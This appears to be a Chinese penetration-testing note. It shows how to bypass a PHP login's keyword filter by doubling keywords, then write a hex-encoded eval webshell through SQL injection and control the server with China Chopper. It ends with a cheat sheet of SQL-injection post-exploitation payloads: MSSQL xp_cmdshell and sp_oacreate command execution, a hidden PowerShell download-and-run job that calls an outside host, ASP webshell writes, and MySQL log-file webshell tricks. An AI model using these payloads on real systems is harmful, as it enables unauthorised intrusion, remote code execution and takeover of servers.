![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317033373-8f7c7d9b-b60a-451a-b28d-ba425f92f9b4.png#align=left&display=inline&height=129&margin=%5Bobject%2Object%5D&name=image.png&originHeight=258&originWidth=554&size=81788&status=done&style=none&width=277)    
2、通过御剑扫描发现了后台路径/admin/login.php
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317036903-c1a03aaf-c415-48e7-a1c9-6b124a0aa140.png#align=left&display=inline&height=146&margin=%5Bobject%2Object%5D&name=image.png&originHeight=291&originWidth=554&size=59025&status=done&style=none&width=277)
3、访问后台
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317042060-67c5cd02-56e2-44e5-a90f-05749886fcdc.png#align=left&display=inline&height=142&margin=%5Bobject%2Object%5D&name=image.png&originHeight=283&originWidth=554&size=60786&status=done&style=none&width=277)
4、抓包并发送到重放数据包模块进行测试
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317045189-57e2568e-0bce-4732-a132-41fb7f0f1967.png#align=left&display=inline&height=118&margin=%5Bobject%2Object%5D&name=image.png&originHeight=237&originWidth=554&size=59839&status=done&style=none&width=277)
5、在账号处加一个单引号测试，发现页面报错了，这里说明存在SQL注入
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317049040-76788297-cf7a-498a-bf05-a94be7c5846d.png#align=left&display=inline&height=92&margin=%5Bobject%2Object%5D&name=image.png&originHeight=184&originWidth=554&size=53711&status=done&style=none&width=277)
6、打开源码，找到该登录处，发现对于post传参的user进行了函数fl_value和fl_html处理。处理之后后面就放到check_login函数执行了。
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317053351-e7c46278-96ce-446c-9113-49f608e9462e.png#align=left&display=inline&height=144&margin=%5Bobject%2Object%5D&name=image.png&originHeight=288&originWidth=554&size=64458&status=done&style=none&width=277)
7、定位fl_value函数，发现对于SQL注入进行了处理，将敏感字符过滤为空。
过滤的敏感字符有：select | insert | update | and | in | on | left | joins | delete | %| = | / * | * | ../ | ./ | union | from | where | group | into | load_file | outfile
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317057459-1b75bd6c-f68f-471d-803f-4606333306ff.png#align=left&display=inline&height=43&margin=%5Bobject%2Object%5D&name=image.png&originHeight=85&originWidth=554&size=19441&status=done&style=none&width=277)
8、很明显这里防SQL注入进行的不是很到位，只进行了一次替换为空，那么就可以通过双写关键字进行绕过。定位第二个处理函数fl_html，发现这里是进行了html实体化处理，是防止xss的，htmlspecialchars函数默认情况下只对双引号进行编码，对我们使用单引号进行SQL注入没有影响。
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317060800-0510c154-b4ff-4202-9b12-37db39d11e93.png#align=left&display=inline&height=29&margin=%5Bobject%2Object%5D&name=image.png&originHeight=58&originWidth=366&size=11625&status=done&style=none&width=183)
9、跟进check_login函数，发现将传入的数据直接放到了SQL查询语句进行查询。那么此处通过双写即可绕过进行注入了。
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317065197-0ab9f91c-73e7-4991-b518-2a049007d84d.png#align=left&display=inline&height=58&margin=%5Bobject%2Object%5D&name=image.png&originHeight=115&originWidth=554&size=27857&status=done&style=none&width=277)
10、回到网站，通过order by 判断出当前数据库字段数为5
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317068401-fc66cb55-5dfb-41f7-9f55-726dab9ffd30.png#align=left&display=inline&height=101&margin=%5Bobject%2Object%5D&name=image.png&originHeight=201&originWidth=554&size=50976&status=done&style=none&width=277)
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317071848-afb83dbf-a19a-40fb-9c66-af5cabf23c07.png#align=left&display=inline&height=80&margin=%5Bobject%2Object%5D&name=image.png&originHeight=160&originWidth=554&size=45734&status=done&style=none&width=277)
11、经测试，联合查询终于成功了。绕过方法：
un union ion -> union
seselectlect -> select
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317076201-0c74fd9e-0530-4941-8e19-68fffcaade81.png#align=left&display=inline&height=111&margin=%5Bobject%2Object%5D&name=image.png&originHeight=221&originWidth=554&size=51714&status=done&style=none&width=277)
12、这里很明显不能显错注入，尝试使用报错注入获取数据也失败，没有将报错的数据输出出来。
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317082978-87ccd5f5-eed6-42b8-bd8c-d313b5d51ff3.png#align=left&display=inline&height=117&margin=%5Bobject%2Object%5D&name=image.png&originHeight=234&originWidth=554&size=62436&status=done&style=none&width=277)
13、尝试使用sql注入写入webshell，发现页面报错了，通过报错信息可以看到是写入的一句话木马里面带有特殊字符影响了文件的写入。对于敏感字符的绕过方法：
in into  -> into
ououtfiletfile -> outfile
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317086950-f53a248a-e529-424b-8033-3d275770dfae.png#align=left&display=inline&height=116&margin=%5Bobject%2Object%5D&name=image.png&originHeight=232&originWidth=554&size=65986&status=done&style=none&width=277)
14、因为符号进行了影响，所以通过16进制来写入webshell，将一句话木马转换为16进制。因为需要数据库识别出这个是16进制的数据，所以要在最前面加上0x。得到16进制的一句话木马：
0x3c3f70687020406576616c28245f524551554553545b315d293b3f3e
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317091049-51499331-b0a7-4eb4-9941-6a45055e0e2d.png#align=left&display=inline&height=152&margin=%5Bobject%2Object%5D&name=image.png&originHeight=304&originWidth=554&size=19492&status=done&style=none&width=277)
15、替换16进制的一句话木马到burp数据包中放包，成功执行了代码，页面返回正常。
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317094983-f7fb5184-1a94-4cf1-8295-4c3423910346.png#align=left&display=inline&height=124&margin=%5Bobject%2Object%5D&name=image.png&originHeight=247&originWidth=554&size=62722&status=done&style=none&width=277)
16、查看服务器文件，成功有了一个8.php文件，内容为一句话木马。
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317099323-d646af4a-b862-405d-823c-b2975028e63e.png#align=left&display=inline&height=127&margin=%5Bobject%2Object%5D&name=image.png&originHeight=254&originWidth=554&size=56751&status=done&style=none&width=277)
17、通过菜刀工具，连接一句话木马，获取网站webshell。
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317103226-679c62de-5503-4996-9ea4-acbbad2e0683.png#align=left&display=inline&height=119&margin=%5Bobject%2Object%5D&name=image.png&originHeight=238&originWidth=554&size=18591&status=done&style=none&width=277)
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317106445-a24046e6-17ce-443d-b37b-63bd3fc90125.png#align=left&display=inline&height=137&margin=%5Bobject%2Object%5D&name=image.png&originHeight=274&originWidth=554&size=41660&status=done&style=none&width=277)
18、进行执行系统命令操作。
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317113216-93f538c1-d58a-4bac-b262-a15d676aa57a.png#align=left&display=inline&height=137&margin=%5Bobject%2Object%5D&name=image.png&originHeight=273&originWidth=554&size=27211&status=done&style=none&width=277)

## 其他类型的SQL注入
### 1、搜索框注入
```php
?id=1' and '1%'='1		//返回正确的搜索结果
?id=1' and '1%'='2		//没有返回结果
```
### 2、header头部注入
Client-IP
User-Agent
X-Forwarded-For


## SQL注入利用
### 1、MSSQL
#### 0x01 --os-shell
```php
for /r C: %i in (*020.jpg*) do @echo %i //寻找020.jpg，获取所在目录

dir c:\phpstudy\WWW\image								//列出某目录下文件

echo ^<%@ Page Language="Jscript"%^>^<%eval(Request.Item["1"],"unsafe");%^> > c:\phpstudy\WWW\image\shell.asp
```
#### 0x02 命令执行
1、xp_cmdshell
```php
#开启xp_cmdshell
?id=1;use master;exec sp_configure 'show advanced options',1;reconfigure;exec sp_configure 'xp_cmdshell',1;reconfigure;

#执行
?id=1;use master;exec master..xp_cmdshell "whoami";

#恢复被删除的xp_cmdshell(提示xplog79.dll找不到则自己上传)
exec sp_addextendedproc xp_cmdshell ,@dllname="D:\\xplog79.dll"
```
2、sp_oacreate
```sql
#xp_cmdshell删除后可以使用sp_oacreate
#开启sp_oacreate
exec sp_configure 'show advanced options',1;
reconfigure with override;
exec sp_configure 'Ole Automation Procedures',1;
reconfigure with override;
exec sp_configure 'show advanced options',0;

#执行[此方法无回显]
declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c whoami >d:\\temp\\1.txt'
```
3、通过沙盒执行命令
4、注册表
5、通过Agent Job执行命令
```sql
#执行cs powershell命令
USE msdb; EXEC dbo.sp_add_job @job_name = N'test_powershell_job1' ; EXEC sp_add_jobstep @job_name = N'test_powershell_job1', @step_name = N'test_powershell_name1', @subsystem = N'PowerShell', @command = N'powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring(''http://192.168.214.129:80/a''))"', @retry_attempts = 1, @retry_interval = 5 ;EXEC dbo.sp_add_jobserver @job_name = N'test_powershell_job1'; EXEC dbo.sp_start_job N'test_powershell_job1';
```
#### 0x03 文件操作
1、判断文件是否存在
```sql
#返回0表示不存在，返回1表示存在
exec xp_fileexist "c:\\users\\public\\test.txt"
```
2、列目录
```sql
#第一个参数表示要查看的文件夹，第二个参数表示递归层数，第三个参数表示展示的内容包括文件。
exec xp_subdirs "C:\Users\Administrator\",2,1
```
3、写文件
```sql
#开启Web Assistant Procedures
exec sp_configure 'Web Assistant Procedures',1;RECONFIGURE;
exec sp_makewebtask 'c:\www\testwr.asp','select''<%execute(request('ss'))%>''
```
4、创建目录
```sql
exec xp_create_subdir 'D:\test'
```
#### 0x04 信息获取
```sql
exec xp_getnetname			//计算机名
exec xp_msver						//系统信息
exec xp_fixeddrives			//驱动器信息
select default_domain() as mydomain;		//获取域名
```
### 2、MYSQL
在高版本的mysql中，一般默认配置了--secure_file_priv为null限制了文件写入，这种情况就需要通过general_log_file/show_query_log_file来尝试写文件。
```sql
#general_log_file
set global general_log='on';
set global general_log_file='D:/phpStudy/WWW/1.php';
select '<?php assert($_POST[1]);?>';
set global general_log='off'; //切记关闭
```
```sql
#show_query_log_file
set global show_query_log='on';
set global show_query_log_file='D:\\phpStudy\\WWW\\1.php';
select sleep(15),'<?php assert($_POST[1]);?>';
set global show_query_log='off'; //切记关闭
```

